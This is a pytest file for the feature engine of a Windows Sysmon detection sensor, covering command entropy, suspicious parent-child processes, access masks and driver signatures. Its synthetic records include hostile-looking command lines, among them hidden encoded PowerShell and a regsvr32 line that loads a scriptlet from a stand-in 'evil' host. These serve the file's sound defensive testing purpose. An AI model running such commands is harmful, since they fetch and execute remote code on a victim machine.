"""
Tier-0 -- Algorithmic validation for windows/sysmon_sensor's feature engine.

Imports the *real* schema.py module directly (no reimplementation) and drives
its compute_* functions with synthetic Sysmon field values, exercising the
exact algorithm that produces the windows_math 6D vector
(command_entropy, parent_child_score, integrity_score, anomaly_score,
grant_access_score, driver_trust_score) which worker_qdrant vectorises into
Qdrant under [schema_mappings.sysmon_sensor].
"""

import math
import pytest
import schema

pytestmark = pytest.mark.tier0

# -----------------------------------------------------------------------------
# command_entropy -- Shannon entropy of CommandLine, normalised to [0, 1]
# -----------------------------------------------------------------------------

class TestCommandEntropy:
    def test_empty_string_is_zero(self):
        assert schema.compute_command_entropy("") == 0.0

    def test_none_is_zero(self):
        assert schema.compute_command_entropy(None) == 0.0

    def test_single_repeated_char_is_zero(self):
        # Shannon entropy of a single-symbol alphabet is 0
        assert schema.compute_command_entropy("aaaaaaaaaa") == 0.0

    def test_base64_encoded_payload_has_higher_entropy_than_plain_command(self):
        base64_cmd = "powershell -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0"
        plain_cmd  = "ipconfig /all"
        assert schema.compute_command_entropy(base64_cmd) > schema.compute_command_entropy(plain_cmd)

    def test_bounded_to_unit_interval(self):
        for cmd in ["dir", "cmd.exe /c whoami /priv", "A" * 500,
                    "powershell -nop -w hidden -enc " + "Q" * 400]:
            e = schema.compute_command_entropy(cmd)
            assert 0.0 <= e <= 1.0

    def test_matches_shannon_formula_normalised_by_8_bits(self):
        cmd = "abab"
        # 2-symbol uniform distribution -> entropy = 1 bit -> normalised 1/8
        expected = 1.0 / 8.0
        assert schema.compute_command_entropy(cmd) == pytest.approx(expected, abs=1e-9)

# -----------------------------------------------------------------------------
# parent_child_score -- suspicious parent->child process relationship lookup
# -----------------------------------------------------------------------------

class TestParentChildScore:
    def test_winword_spawning_powershell_is_highly_suspicious(self):
        score = schema.compute_parent_child_score(
            r"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE",
            r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        )
        assert score >= 0.9

    def test_winlogon_spawning_cmd_is_near_certain(self):
        score = schema.compute_parent_child_score(
            r"C:\Windows\System32\winlogon.exe",
            r"C:\Windows\System32\cmd.exe",
        )
        assert score == pytest.approx(0.99)

    def test_explorer_spawning_chrome_is_normal(self):
        score = schema.compute_parent_child_score(
            r"C:\Windows\explorer.exe",
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        )
        assert score == 0.0

    def test_lookup_is_case_insensitive_and_path_agnostic(self):
        # Same logical pair, different casing/path -- basename lookup must still match
        score = schema.compute_parent_child_score(
            r"c:\windows\system32\spoolsv.EXE",
            r"C:\Users\Public\CMD.EXE",
        )
        assert score == pytest.approx(0.95)

    def test_missing_either_image_is_zero(self):
        assert schema.compute_parent_child_score("", "powershell.exe") == 0.0
        assert schema.compute_parent_child_score("explorer.exe", "") == 0.0
        assert schema.compute_parent_child_score(None, None) == 0.0

# -----------------------------------------------------------------------------
# integrity_score -- IntegrityLevel string -> [0, 1]
# -----------------------------------------------------------------------------

class TestIntegrityScore:
    @pytest.mark.parametrize("level,expected", [
        ("Low", 0.0), ("Medium", 0.33), ("High", 0.67), ("System", 1.0),
        ("LOW", 0.0), ("system", 1.0),  # case-insensitive
    ])
    def test_known_levels_map_to_expected_scores(self, level, expected):
        assert schema.compute_integrity_score(level) == pytest.approx(expected)

    def test_unknown_or_missing_level_defaults_to_medium(self):
        assert schema.compute_integrity_score("") == pytest.approx(0.33)
        assert schema.compute_integrity_score(None) == pytest.approx(0.33)
        assert schema.compute_integrity_score("Bogus") == pytest.approx(0.33)

# -----------------------------------------------------------------------------
# grant_access_score -- EventID 10 GrantedAccess hex -> [0, 1]
# -----------------------------------------------------------------------------

class TestGrantAccessScore:
    def test_process_all_access_is_maximal(self):
        assert schema.compute_grant_access_score({"GrantedAccess": "0x1FFFFF"}) == pytest.approx(1.0)

    def test_query_limited_information_is_near_zero(self):
        score = schema.compute_grant_access_score({"GrantedAccess": "0x1000"})
        assert 0.0 < score < 0.01

    def test_missing_field_is_zero(self):
        assert schema.compute_grant_access_score({}) == 0.0
        assert schema.compute_grant_access_score({"GrantedAccess": None}) == 0.0

    def test_malformed_value_is_zero_not_an_exception(self):
        assert schema.compute_grant_access_score({"GrantedAccess": "not-a-hex-value"}) == 0.0

    def test_clamped_to_unit_interval_even_if_access_exceeds_all_access(self):
        # 0x1FFFFF is PROCESS_ALL_ACCESS; a (hypothetically) larger raw value
        # must still clamp to 1.0, not overflow past it.
        assert schema.compute_grant_access_score({"GrantedAccess": "0xFFFFFFFF"}) == pytest.approx(1.0)

# -----------------------------------------------------------------------------
# driver_trust_score -- EventID 6/7 signature validity, INVERTED
# -----------------------------------------------------------------------------

class TestDriverTrustScore:
    def test_unsigned_driver_is_maximal_suspicion(self):
        assert schema.compute_driver_trust_score({"Signed": False, "SignatureStatus": ""}) == pytest.approx(1.0)

    def test_signed_and_valid_is_zero(self):
        assert schema.compute_driver_trust_score({"Signed": True, "SignatureStatus": "Valid"}) == pytest.approx(0.0)

    def test_expired_signature_is_loldriver_signal(self):
        score = schema.compute_driver_trust_score({"Signed": True, "SignatureStatus": "Expired"})
        assert score == pytest.approx(0.9)

    def test_invalid_or_revoked_signature(self):
        for status in ("Invalid", "Revoked"):
            score = schema.compute_driver_trust_score({"Signed": True, "SignatureStatus": status})
            assert score == pytest.approx(0.8)

    def test_non_driver_event_is_zero(self):
        # Neither field present -- this isn't EventID 6/7 telemetry
        assert schema.compute_driver_trust_score({}) == 0.0
        assert schema.compute_driver_trust_score({"Image": "cmd.exe"}) == 0.0

# -----------------------------------------------------------------------------
# compute_features -- the full 6D windows_math vector
# -----------------------------------------------------------------------------

class TestComputeFeatures:
    def test_returns_six_floats_all_in_unit_interval(self):
        result = schema.compute_features({
            "CommandLine":    "powershell.exe -nop -w hidden -enc QQBBAEEAQQA=",
            "Image":          r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "ParentImage":    r"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE",
            "IntegrityLevel": "High",
            "GrantedAccess":  None,
            "Signed":         None,
            "SignatureStatus": None,
        })
        assert isinstance(result, tuple)
        assert len(result) == 6
        for v in result:
            assert isinstance(v, float)
            assert 0.0 <= v <= 1.0

    def test_anomaly_score_placeholder_is_half(self):
        # vector[3] is a fixed 0.5 placeholder, overwritten by Model A at inference time
        _, _, _, anomaly, _, _ = schema.compute_features({})
        assert anomaly == 0.5

    def test_vector_order_matches_schema_doc(self):
        """
        Cross-check the documented order in schema.py's module docstring
        ([0] command_entropy ... [5] driver_trust_score) against the actual
        tuple returned -- this is the order worker_qdrant indexes raw_math by.
        """
        record = {
            "CommandLine": "regsvr32.exe /s /u /i:http://evil/x.sct scrobj.dll",
            "Image": r"C:\Windows\System32\regsvr32.exe",
            "ParentImage": r"C:\Windows\System32\cmd.exe",
            "IntegrityLevel": "High",
            "GrantedAccess": "0x1FFFFF",
            "Signed": False,
            "SignatureStatus": "",
        }
        cmd_ent, pc_score, int_score, anomaly, ga_score, dt_score = schema.compute_features(record)
        assert cmd_ent  == pytest.approx(schema.compute_command_entropy(record["CommandLine"]))
        assert pc_score == pytest.approx(schema.compute_parent_child_score(record["ParentImage"], record["Image"]))
        assert int_score == pytest.approx(schema.compute_integrity_score(record["IntegrityLevel"]))
        assert anomaly == 0.5
        assert ga_score == pytest.approx(schema.compute_grant_access_score(record))
        assert dt_score == pytest.approx(schema.compute_driver_trust_score(record))